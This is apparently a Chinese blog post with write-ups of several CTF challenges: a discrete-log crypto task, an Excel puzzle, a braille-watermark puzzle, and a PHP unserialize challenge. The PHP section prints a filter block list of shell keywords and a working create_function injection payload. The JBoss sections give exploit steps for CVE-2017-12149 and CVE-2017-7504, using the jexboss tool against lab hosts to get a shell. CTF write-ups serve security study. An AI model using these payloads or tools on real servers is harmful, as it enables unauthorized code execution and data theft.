# 近期一些CTF的writeup



<div class="has-toc have-toc">
</div>

## 0x00 签到

<pre class="wp-block-code"><code>from Crypto.Util.number import *
import random
flag=b'flag{******************}'
n = 2 ** 256
flaglong=bytes_to_long(flag)
m = random.randint(2, n-1) | 1
c = pow(m, flaglong, n)
print('m = ' + str(m))
print('c = ' + str(c))
# m = 73964803637492582853353338913523546944627084372081477892312545091623069227301
# c = 21572244511100216966799370397791432119463715616349800194229377843045443048821</code></pre>

这是一个求解离散对数的问题——经过查询在sage下有discrete_log函数可以直接解决问题，`discrete_log(Mod(c,n),Mod(m,n))`，在sagemath的docker下运行。<figure class="wp-block-image size-full">

<img loading="lazy" width="974" height="55" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-192.png" alt="" class="wp-image-3893" /> </figure> 

得到`34852863801130149185238904762083023615101`，利用`long_to_bytes`得到`flag{DASCTF_zjut}`

## 0x02 hellounser

源代码如下：

```php
<?php
class A {
    public $var;
    public function show(){
        echo $this->var;
    }
    public function __invoke(){
        $this->show();
    }
}

class B{
    public $func;
    public $arg;
    
    public function show(){
        $func = $this->func;
        if(preg_match('/^[a-z0-9]*$/isD', $this->func) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i', $this->arg)) { 
            die('No!No!No!'); 
        } else { 
            include "flag.php";
            //There is no code to print flag in flag.php
            $func('', $this->arg); 
        }
    }
    
    public function __toString(){
        $this->show();
        return "<br>"."Nice Job!!"."<br>";
    }
    
    
}

if(isset($_GET['pop'])){
    $aaa = unserialize($_GET['pop']);
    $aaa();
}
else{
    highlight_file(__FILE__);
}

?> 
```

参考<a rel="noreferrer noopener" href="https://www.gem-love.com/ctf/770.html" target="_blank" rel="nofollow" >https://www.gem-love.com/ctf/770.html</a>

现在的困难：

  * 不能通过 `system()` 等函数执行系统命令，就无法 `cat flag.php`
  * 过滤了 flag 等关键字，不能操作 `$flag` 变量
  * 过滤了 print 等关键字，不能直接读取或类似无参数 RCE 的方法 flag.php 源代码

但是代码明确写了包含 flag.php，在不指定变量名称的情况下输出变量的值，`get_defined_vars()` 可以用来输出所有变量和值。构造如下的payload

```php
<?php
class A {
    public $var;
}

class B{
    public $func;
    public $arg;
}

$a = new A();
$b = new B();

$b->func = "create_function";
$b->arg = "};var_dump(get_defined_vars());//";
$a->var = $b;

echo serialize($a);
#O:1:"A":1:{s:3:"var";O:1:"B":2:{s:4:"func";s:15:"create_function";s:3:"arg";s:33:"};var_dump(get_defined_vars());//";}}
?> 
```

上传pop的值得到<figure class="wp-block-image size-full">

<img loading="lazy" width="1076" height="68" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-206.png" alt="" class="wp-image-3924" /> </figure> 

现在的困难：

  * 过滤了 include 关键字
  * 过滤了单引号双引号
  * 过滤了 flag 关键字和类似无参数 RCE 题目中能够得到 1flag.php 字符串的各种函数的关键字，比如无法 `scandir()`

应对的策略：

  * 过滤了 include 还能用 require
  * 过滤了引号，可以使用那些参数可以不加引号的函数，`require()` 代替 `require " "`
  * 过滤了 flag，可以 base64 编码。其他过滤的不用便是

修改

<pre class="wp-block-code"><code>$b-&gt;arg = "};require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());//";</code></pre><figure class="wp-block-image size-full">

<img loading="lazy" width="1848" height="148" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-207.png" alt="" class="wp-image-3925" /> </figure> 

## 0x03 Girlfriend's account

jackie的女朋友又偷偷用他的信用卡买东西了，你能算算一共花了多少钱吗？

打开Excel，提示flag{账单总金额四舍五入保留至小数点后两位}，例如总金额为 543.21 元时，你需要提交 flag{543.21}<figure class="wp-block-image size-full">

<img loading="lazy" width="238" height="404" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-193.png" alt="" class="wp-image-3895" /> </figure> 

套用公式

```
=SUM(ISNUMBER(SEARCH(TEXT({1,2,3,4,5,6,7,8,9},"[dbnum2]"&{"0亿";"0仟!*万";"0佰!*万";"0拾!*万";"0万";"万!*0仟";"万!*0佰";"万!*0拾";"0元";"0角";"0分"}),IF(ISERR(FIND("万",A2)),"万",)&A2))*{1,2,3,4,5,6,7,8,9}*10^{8;7;6;5;4;3;2;1;0;-1;-2})
```

<img loading="lazy" width="332" height="204" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-204.png" alt="" class="wp-image-3918" /> </figure> 

然后把值粘贴出来，把件数替换成阿拉伯数字。再用公式`=A2*B2`计算，最后`=SUM(C1:C5001)`<figure class="wp-block-image size-full">

<img loading="lazy" width="317" height="274" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-205.png" alt="" class="wp-image-3919" /> </figure> 

## 0x03 双目失明，身残志坚

打开压缩包，得到两张图<figure class="wp-block-image size-full">

<img loading="lazy" width="306" height="148" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-194.png" alt="" class="wp-image-3897" /> </figure> 

两张看起来一样的图，blind，联想到了盲水印，解一下。<figure class="wp-block-image size-full">

<img loading="lazy" width="1038" height="57" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-195.png" alt="" class="wp-image-3898" /> </figure> 

看起来像是盲文，对应的点是34,26,1245,1346,1245,256,15,145,35,125,23456<figure class="wp-block-image size-full">

<img loading="lazy" width="1443" height="890" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-196.png" alt="" class="wp-image-3899" /> </figure> 

试了下转日文，发现不太行。又对照<a rel="noreferrer noopener" href="https://zh.wikipedia.org/wiki/%E7%8E%B0%E8%A1%8C%E7%9B%B2%E6%96%87" data-type="URL" data-id="https://zh.wikipedia.org/wiki/%E7%8E%B0%E8%A1%8C%E7%9B%B2%E6%96%87" target="_blank" rel="nofollow" >维基</a>尝试了下汉语拼音。得到如下结果：

<pre class="wp-block-code"><code>zh(i) e/o g/j iang(yang) g/j ong(weng) ie(ye) d a h/x ue(yue)</code></pre>

组合一下，惊奇地发现是`zhejianggongyedaxue`

## 0x04 [Jboss]CVE-2017-12149

漏洞名称：Jboss 反序列化(CVE-2017-12149)

漏洞描述：JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。在/invoker/readonly路径下，攻击者可以构造序列化代码传入服务器进行反序列化,由于没有对反序列化操作进行任何检测，导致攻击者可以执行任意代码。

漏洞影响：Redhat JBoss Enterprise Application Platform 5.0

参考：<a href="https://juejin.cn/post/6869587131678294023" target="_blank" rel="noreferrer noopener" rel="nofollow" >https://juejin.cn/post/6869587131678294023</a>

<a href="https://github.com/yunxu1/jboss-_CVE-2017-12149" target="_blank"  rel="nofollow" >https://github.com/yunxu1/jboss-_CVE-2017-12149</a><figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-197.png" alt="" class="wp-image-3900" width="333" height="303" /> </figure> 

打印环境变量env，获得`flag{d0c54aa0-5bce-4fd6-84a1-e01230f23d19}`<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-198.png" alt="" class="wp-image-3901" width="441" height="401" /> </figure> 

## 0x05 [Jboss]CVE-2017-7504

`git clone https://github.com/joaomatosf/jexboss`，cd到jexboss文件夹下执行`python3 jexboss.py -u http://node4.buuoj.cn:28056/`，发现存在漏洞。<figure class="wp-block-image size-full">

<img loading="lazy" width="465" height="352" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-200.png" alt="" class="wp-image-3906" /> </figure> 

输入yes后，工具自动进行漏洞利用，利用成功会出现shell的命令行，可执行相关命令。<figure class="wp-block-image size-full">

<img loading="lazy" width="895" height="677" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-201.png" alt="" class="wp-image-3907" /> </figure> 

查看环境变量，得到flag。<figure class="wp-block-image size-full">

<img loading="lazy" width="497" height="270" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-202.png" alt="" class="wp-image-3909" /> </figure> 

## 0x06 [JBoss]JMXInvokerServlet-deserialization

同样使用jboss反序列化工具，查看环境变量即可。<figure class="wp-block-image size-full">

<img loading="lazy" width="553" height="381" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-203.png" alt="" class="wp-image-3914" /> </figure>
